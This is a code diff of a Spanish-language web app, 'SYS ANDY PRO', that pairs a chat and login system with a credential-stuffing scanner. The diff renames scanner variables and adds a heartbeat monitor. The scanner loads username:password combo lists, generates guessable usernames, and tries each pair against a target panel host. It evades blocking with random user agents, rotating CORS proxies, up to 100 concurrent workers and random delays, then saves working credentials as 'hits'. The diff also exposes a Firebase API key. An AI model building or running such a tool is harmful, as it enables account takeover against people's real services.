@@ -6,7 +6,7 @@
     <title>SYS ANDY PRO - LEÓN ROJO + CHAT WHATSAPP + ESTADÍSTICAS</title>
     <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
     <style>
-        /* ========== PALETA LEÓN ROJO + NEGRO ========== */
+        /* ========== PALETA LEÓN ROJO + NEGRO con difuminaciones ========== */
         :root {
             --bg-principal: #000000;
             --bg-tarjeta: #1a0505;
@@ -883,7 +883,7 @@
 </div>
 
 <script>
-    // ==================== CONFIGURACIÓN FIREBASE ====================
+    // ==================== FIREBASE CONFIG ====================
     const firebaseConfig = {
         apiKey: "AIzaSyDGE5GTlwIypuryIVnDYiTR9a2wyCgWkfs",
         authDomain: "gestion-ventas-pro-f8de4.firebaseapp.com",
@@ -1156,6 +1156,7 @@
         if (window.chatUnsubscribe) window.chatUnsubscribe();
         if (window.pendingUnsub) db.ref("pending_users").off();
         if (window.vendedoresUnsub) db.ref("vendedores").off();
+        if (heartbeatInterval) clearInterval(heartbeatInterval);
         currentUser = null;
         document.getElementById('loginEmail').value = '';
         document.getElementById('loginPass').value = '';
@@ -1270,7 +1271,7 @@
         if (tabName === 'banned' && currentUser?.role === 'Owner') cargarBaneados();
     }
 
-    // ==================== COMBOS ====================
+    // ==================== COMBOS (COMPLETO) ====================
     const nombresReales = ["juan","pedro","carlos","luis","andres","david","diego","javier","manuel","alejandro","fernando","miguel","rafael","jorge","antonio","angel","jose","daniel","oscar","ruben"];
     const palabrasExtra = ["admin","user","test","root","master","demo","guest","support","office","system","server","network","digital","global","prime","super","mega","ultra","power","plus"];
     function applyCase(str, caseType) { if (caseType === 'upper') return str.toUpperCase(); if (caseType === 'capitalize') return str.charAt(0).toUpperCase() + str.slice(1).toLowerCase(); return str.toLowerCase(); }
@@ -1327,14 +1328,27 @@
     document.getElementById('mergeFile3').addEventListener('change',()=>readMergeFile(document.getElementById('mergeFile3'), mergeData.file3));
     document.querySelectorAll('.sub-tab').forEach(btn=>{ btn.addEventListener('click',()=>{ const subId=btn.getAttribute('data-sub'); document.querySelectorAll('.sub-tab').forEach(b=>b.classList.remove('active')); btn.classList.add('active'); document.querySelectorAll('.sub-panel').forEach(p=>p.classList.remove('active')); document.getElementById(`sub-${subId}`).classList.add('active'); }); });
 
-    // ==================== ESCÁNER MUNRRA ORIGINAL (COPIADO ÍNTEGRO) ====================
-    // Variables globales del escáner (evitamos conflictos con el chat)
-    let isRunningScanner = false;
-    let stopRequestedScanner = false;
+    // ==================== NUEVO ESCÁNER MUNRRA (CÓDIGO ORIGINAL) ====================
+    // Este escáner es exactamente el que funciona. Se ha integrado respetando las funciones de guardado.
+    let isRunning = false;
+    let stopRequested = false;
     let serverIP = null, serverGeo = null;
     let combos1 = [], combos2 = [], combos3 = [], combosTxt = [];
-    const HITS_SCANNER = { 1: [], 2: [], 3: [] };
-    let audioCtxScanner = null;
+    const HITS = { 1: [], 2: [], 3: [] };
+    let audioCtx = null;
+    let heartbeatInterval = null;
+
+    function iniciarHeartbeatEscanner() {
+        if (heartbeatInterval) clearInterval(heartbeatInterval);
+        heartbeatInterval = setInterval(() => {
+            if (isRunning && (Date.now() - lastScanProgress > 15000)) {
+                showNotification("⚠️ ESCÁNER DETENIDO", "El escáner no responde. Revisa la conexión o reinicia.");
+                console.warn("Heartbeat: escáner detenido inesperadamente");
+            }
+        }, 10000);
+    }
+    let lastScanProgress = Date.now();
+    function actualizarHeartbeat() { lastScanProgress = Date.now(); }
 
     function randomUA() {
         const uas = [
@@ -1366,7 +1380,7 @@
         return opts;
     }
 
-    // i18n básico para el escáner
+    // i18n básico (solo español)
     const tScanner = (key) => {
         const dict = {
             hostLabel: "Panel (host con o sin http/https):", hostPH: "ej: lista.com:8080",
@@ -1392,40 +1406,41 @@
 
     function limpiarHost(host) { return host.replace(/^https?:\/\//, '').trim(); }
 
-    function uiForScanner(job) {
+    function uiFor(job) {
         if (job === 1) return {
             fill: document.getElementById('progressBarFill'),
             text: document.getElementById('progressText'),
             user: document.getElementById('currentCombo'),
             hitsCountEl: document.getElementById('hitsCount1'),
-            hitsArr: HITS_SCANNER[1]
+            hitsArr: HITS[1]
         };
         if (job === 2) return {
             fill: document.getElementById('progressBarFill2'),
             text: document.getElementById('progressText2'),
             user: document.getElementById('currentCombo2'),
             hitsCountEl: document.getElementById('hitsCount2'),
-            hitsArr: HITS_SCANNER[2]
+            hitsArr: HITS[2]
         };
         return {
             fill: document.getElementById('progressBarFill3'),
             text: document.getElementById('progressText3'),
             user: document.getElementById('currentCombo3'),
             hitsCountEl: document.getElementById('hitsCount3'),
-            hitsArr: HITS_SCANNER[3]
+            hitsArr: HITS[3]
         };
     }
 
-    function actualizarProgresoJobScanner(state, ui) {
+    function actualizarProgresoJob(state, ui) {
         const { processed, total } = state;
         const pct = total === 0 ? 0 : (processed / total) * 100;
         if (ui.fill) ui.fill.style.width = pct + '%';
         if (ui.text) ui.text.textContent = `${tScanner('processed')}: ${processed} / ${total} | ${tScanner('hitsFound')}: ${ui.hitsArr.length}`;
         if (ui.hitsCountEl) ui.hitsCountEl.innerHTML = `${tScanner('hitsFound')}: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
-        updateStatsOnScan(); // Actualizar estadísticas globales
+        updateStatsOnScan();
+        actualizarHeartbeat();
     }
 
-    function updateStartStateScanner() {
+    function updateStartState() {
         const hasHost = !!document.getElementById('hostInput').value.trim();
         const hasAnyCombos = (combos1.length || combos2.length || combos3.length || combosTxt.length);
         document.getElementById('startBtn').disabled = !(hasHost && hasAnyCombos);
@@ -1554,7 +1569,7 @@
 
     async function validarCombo(host, combo, opts = {}, session = null, ui = null, jobId = null) {
         try {
-            if (stopRequestedScanner) return null;
+            if (stopRequested) return null;
             const pair = Array.isArray(combo) ? combo : extractCombo(combo);
             if (!pair) return null;
             const [user, pass] = pair;
@@ -1627,22 +1642,22 @@ ${tScanner('groupsB')}`;
         if (ui.hitsCountEl) {
             ui.hitsCountEl.innerHTML = `${tScanner('hitsFound')}: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
         }
-        // Guardar el hit en el banco local
+        // Guardar en banco local y notificar
         guardarHitEnBanco(hit.texto, hit.user, hit.pass);
         // Sonido
         if (document.getElementById('soundToggle')?.checked) {
             try {
-                if (!audioCtxScanner) {
+                if (!audioCtx) {
                     const Ctx = window.AudioContext || window.webkitAudioContext;
-                    if (Ctx) audioCtxScanner = new Ctx();
+                    if (Ctx) audioCtx = new Ctx();
                 }
-                if (audioCtxScanner) {
-                    const o = audioCtxScanner.createOscillator(), g = audioCtxScanner.createGain();
-                    o.type = 'sine'; o.frequency.setValueAtTime(880, audioCtxScanner.currentTime);
-                    g.gain.setValueAtTime(0, audioCtxScanner.currentTime);
-                    g.gain.linearRampToValueAtTime(0.22, audioCtxScanner.currentTime + 0.01);
-                    g.gain.exponentialRampToValueAtTime(0.0008, audioCtxScanner.currentTime + 0.18);
-                    o.connect(g); g.connect(audioCtxScanner.destination); o.start(); o.stop(audioCtxScanner.currentTime + 0.2);
+                if (audioCtx) {
+                    const o = audioCtx.createOscillator(), g = audioCtx.createGain();
+                    o.type = 'sine'; o.frequency.setValueAtTime(880, audioCtx.currentTime);
+                    g.gain.setValueAtTime(0, audioCtx.currentTime);
+                    g.gain.linearRampToValueAtTime(0.22, audioCtx.currentTime + 0.01);
+                    g.gain.exponentialRampToValueAtTime(0.0008, audioCtx.currentTime + 0.18);
+                    o.connect(g); g.connect(audioCtx.destination); o.start(); o.stop(audioCtx.currentTime + 0.2);
                     if (navigator.vibrate) try { navigator.vibrate(80); } catch (_) { }
                 }
             } catch (_) { }
@@ -1651,7 +1666,7 @@ ${tScanner('groupsB')}`;
     }
 
     async function processarCombosJob(host, combos, conc, jobId) {
-        const ui = uiForScanner(jobId);
+        const ui = uiFor(jobId);
         ui.hitsArr.length = 0;
         if (ui.hitsCountEl) ui.hitsCountEl.innerHTML = `${tScanner('hitsFound')}: <span class="yellow-hit">0</span>`;
         if (ui.fill) ui.fill.style.width = '0%';
@@ -1659,13 +1674,13 @@ ${tScanner('groupsB')}`;
         let processed = 0;
         if (ui.text) ui.text.textContent = tScanner('waiting');
         if (ui.user) ui.user.textContent = `${tScanner('currentUser')}: -`;
-        actualizarProgresoJobScanner({ processed, total }, ui);
+        actualizarProgresoJob({ processed, total }, ui);
         conc = Math.max(1, Math.min(100, conc | 0));
         const sleep = ms => new Promise(r => setTimeout(r, ms));
         let index = 0;
         async function worker() {
             const session = createSession();
-            while (index < total && !stopRequestedScanner) {
+            while (index < total && !stopRequested) {
                 const i = index++;
                 if (i >= total) break;
                 const combo = combos[i];
@@ -1675,7 +1690,7 @@ ${tScanner('groupsB')}`;
                 opts = attachCookies(opts, session);
                 try {
                     const hit = await validarCombo(host, combo, opts, session, ui, jobId);
-                    if (stopRequestedScanner) break;
+                    if (stopRequested) break;
                     if (hit) {
                         ui.hitsArr.push(hit);
                         mostrarHit(hit, ui);
@@ -1683,17 +1698,17 @@ ${tScanner('groupsB')}`;
                 } catch (_) { }
                 finally {
                     processed++;
-                    actualizarProgresoJobScanner({ processed, total }, ui);
+                    actualizarProgresoJob({ processed, total }, ui);
                 }
                 await sleep(40 + Math.random() * 140);
-                if (stopRequestedScanner) break;
+                if (stopRequested) break;
             }
         }
         if (ui.text) ui.text.textContent = tScanner('starting');
         await sleep((jobId - 1) * 100);
         await Promise.all(Array.from({ length: conc }, () => worker()));
         if (ui.user) ui.user.textContent = `${tScanner('currentUser')}: -`;
-        if (ui.text) ui.text.textContent += (stopRequestedScanner ? tScanner('scanStopped') : tScanner('scanDone'));
+        if (ui.text) ui.text.textContent += (stopRequested ? tScanner('scanStopped') : tScanner('scanDone'));
     }
 
     function dedupeHits(arr) {
@@ -1708,12 +1723,12 @@ ${tScanner('groupsB')}`;
     }
 
     function buildHitsTextAll({ groupByJob = true, dedupe = true } = {}) {
-        const j1 = HITS_SCANNER[1] || [], j2 = HITS_SCANNER[2] || [], j3 = HITS_SCANNER[3] || [];
+        const j1 = HITS[1] || [], j2 = HITS[2] || [], j3 = HITS[3] || [];
         let all = [...j1, ...j2, ...j3];
         if (dedupe) all = dedupeHits(all);
-        const total = (HITS_SCANNER[1]?.length || 0) + (HITS_SCANNER[2]?.length || 0) + (HITS_SCANNER[3]?.length || 0);
+        const total = (HITS[1]?.length || 0) + (HITS[2]?.length || 0) + (HITS[3]?.length || 0);
         const totalAfter = all.length;
-        const header = `=============== SYS ANDY PRO ================\nScan1: ${HITS_SCANNER[1]?.length || 0} hits\nScan2: ${HITS_SCANNER[2]?.length || 0} hits\nScan3: ${HITS_SCANNER[3]?.length || 0} hits\nTotal (brut): ${total} | Únicos: ${totalAfter}\n================================================\n\n`;
+        const header = `=============== SYS ANDY PRO ================\nScan1: ${HITS[1]?.length || 0} hits\nScan2: ${HITS[2]?.length || 0} hits\nScan3: ${HITS[3]?.length || 0} hits\nTotal (brut): ${total} | Únicos: ${totalAfter}\n================================================\n\n`;
         if (!groupByJob) {
             const body = all.map(h => h.texto).join('\n\n-----------------\n\n');
             return header + (body || '');
@@ -1751,7 +1766,7 @@ ${tScanner('groupsB')}`;
     function readTxtFile(inputEl, targetArray) {
         targetArray.length = 0;
         const f = inputEl.files?.[0];
-        if (!f) { updateStartStateScanner(); return; }
+        if (!f) { updateStartState(); return; }
         const r = new FileReader();
         r.onload = e => {
             const lines = String(e.target.result || '').split(/\r?\n/);
@@ -1759,12 +1774,11 @@ ${tScanner('groupsB')}`;
                 const pair = extractCombo(line.trim());
                 if (pair) targetArray.push(`${pair[0]}:${pair[1]}`);
             }
-            updateStartStateScanner();
+            updateStartState();
         };
         r.readAsText(f);
     }
 
-    // Asignar eventos de los inputs del escáner
     document.getElementById('comboFile1').addEventListener('change', () => readTxtFile(document.getElementById('comboFile1'), combos1));
     document.getElementById('comboFile2').addEventListener('change', () => readTxtFile(document.getElementById('comboFile2'), combos2));
     document.getElementById('comboFile3').addEventListener('change', () => readTxtFile(document.getElementById('comboFile3'), combos3));
@@ -1778,20 +1792,20 @@ ${tScanner('groupsB')}`;
                 if (pair) combosTxt.push(`${pair[0]}:${pair[1]}`);
             }
         }
-        updateStartStateScanner();
+        updateStartState();
     });
-    document.getElementById('hostInput').addEventListener('input', updateStartStateScanner);
+    document.getElementById('hostInput').addEventListener('input', updateStartState);
 
     document.getElementById('startBtn').addEventListener('click', async () => {
-        if (isRunningScanner) return;
-        if (audioCtxScanner && audioCtxScanner.state === 'suspended') { try { await audioCtxScanner.resume(); } catch (_) { } }
+        if (isRunning) return;
+        if (audioCtx && audioCtx.state === 'suspended') { try { await audioCtx.resume(); } catch (_) { } }
         document.getElementById('startBtn').disabled = true;
         document.getElementById('saveBtn').disabled = true;
         document.getElementById('stopBtn').disabled = true;
-        stopRequestedScanner = false;
+        stopRequested = false;
         if (document.getElementById('hitsContainer')) document.getElementById('hitsContainer').textContent = '';
         [document.getElementById('hitsCount1'), document.getElementById('hitsCount2'), document.getElementById('hitsCount3')].forEach(el => { if (el) el.innerHTML = `${tScanner('hitsFound')}: <span class="yellow-hit">0</span>`; });
-        Object.values(HITS_SCANNER).forEach(arr => arr.length = 0);
+        Object.values(HITS).forEach(arr => arr.length = 0);
         [document.getElementById('progressBarFill'), document.getElementById('progressBarFill2'), document.getElementById('progressBarFill3')].forEach(el => { if (el) el.style.width = '0%'; });
         [document.getElementById('progressText'), document.getElementById('progressText2'), document.getElementById('progressText3')].forEach(el => { if (el) el.textContent = tScanner('resolving'); });
         [document.getElementById('currentCombo'), document.getElementById('currentCombo2'), document.getElementById('currentCombo3')].forEach(el => { if (el) el.textContent = `${tScanner('currentUser')}: -`; });
@@ -1804,7 +1818,7 @@ ${tScanner('groupsB')}`;
             combosTxt = [];
             if (document.getElementById('comboText')) document.getElementById('comboText').value = '';
         }
-        isRunningScanner = true;
+        isRunning = true;
         setTimeout(() => { document.getElementById('stopBtn').disabled = false; }, 300);
         JOB_PROXIES = {};
         const shuffled = [...CORS_PROXIES].sort(() => Math.random() - 0.5);
@@ -1818,31 +1832,31 @@ ${tScanner('groupsB')}`;
         if (combos2.length) jobs.push(processarCombosJob(host, combos2, perConc, 2));
         if (combos3.length) jobs.push(processarCombosJob(host, combos3, perConc, 3));
         if (jobs.length === 0) {
-            isRunningScanner = false;
+            isRunning = false;
             document.getElementById('startBtn').disabled = false;
             document.getElementById('saveBtn').disabled = false;
             document.getElementById('stopBtn').disabled = true;
-            updateStartStateScanner();
+            updateStartState();
             return;
         }
         Promise.allSettled(jobs).then(() => {
-            isRunningScanner = false;
+            isRunning = false;
             document.getElementById('stopBtn').disabled = true;
             try {
-                const totalHits = (HITS_SCANNER[1]?.length || 0) + (HITS_SCANNER[2]?.length || 0) + (HITS_SCANNER[3]?.length || 0);
+                const totalHits = (HITS[1]?.length || 0) + (HITS[2]?.length || 0) + (HITS[3]?.length || 0);
                 if (document.getElementById('autoDownload') && document.getElementById('autoDownload').checked && totalHits > 0) {
                     saveHitsAll(host, { allowEmpty: false, groupByJob: true, dedupe: true });
                 }
             } catch (_) { }
             document.getElementById('startBtn').disabled = false;
             document.getElementById('saveBtn').disabled = false;
-            updateStartStateScanner();
+            updateStartState();
         });
     });
 
     document.getElementById('stopBtn').addEventListener('click', () => {
-        if (!isRunningScanner) return;
-        stopRequestedScanner = true;
+        if (!isRunning) return;
+        stopRequested = true;
         document.getElementById('stopBtn').disabled = true;
         [document.getElementById('progressText'), document.getElementById('progressText2'), document.getElementById('progressText3')].forEach(el => { if (el) el.textContent += tScanner('scanStopped'); });
     });
@@ -1853,9 +1867,9 @@ ${tScanner('groupsB')}`;
         saveHitsAll(host, { allowEmpty: true, groupByJob: true, dedupe: true });
     });
 
-    updateStartStateScanner();
+    updateStartState();
 
-    // ==================== CHAT WHATSAPP (completo y funcional) ====================
+    // ==================== CHAT WHATSAPP (COMPLETO Y FUNCIONAL) ====================
     let chatDisplayName = "", chatAvatar = "🦁";
     let currentReplyTo = null;
     let mentionUsersList = [];
@@ -1871,10 +1885,8 @@ ${tScanner('groupsB')}`;
         const snapshot = await perfilRef.once('value');
         if (snapshot.exists()) { const data = snapshot.val(); chatDisplayName = data.name || email.split('@')[0]; chatAvatar = data.avatar || "🦁"; }
         else { chatDisplayName = email.split('@')[0]; chatAvatar = "🦁"; await perfilRef.set({ name: chatDisplayName, avatar: chatAvatar }); }
-        const displayNameInput = document.getElementById('displayName');
-        if (displayNameInput) displayNameInput.value = chatDisplayName;
-        const avatarSelect = document.getElementById('avatarSelect');
-        if (avatarSelect) avatarSelect.textContent = chatAvatar;
+        document.getElementById('displayName').value = chatDisplayName;
+        document.getElementById('avatarSelect').textContent = chatAvatar;
     }
 
     function renderizarMensajesWhatsApp(messages) {
@@ -2031,7 +2043,6 @@ ${tScanner('groupsB')}`;
         document.addEventListener('click', (e) => { if (!suggestionsDiv.contains(e.target) && e.target !== input) hideSuggestions(); });
     }
 
-    // Asignar eventos del chat
     document.getElementById('saveProfileBtn').addEventListener('click', async () => {
         const newName = document.getElementById('displayName')?.value.trim();
         if (newName) chatDisplayName = newName;
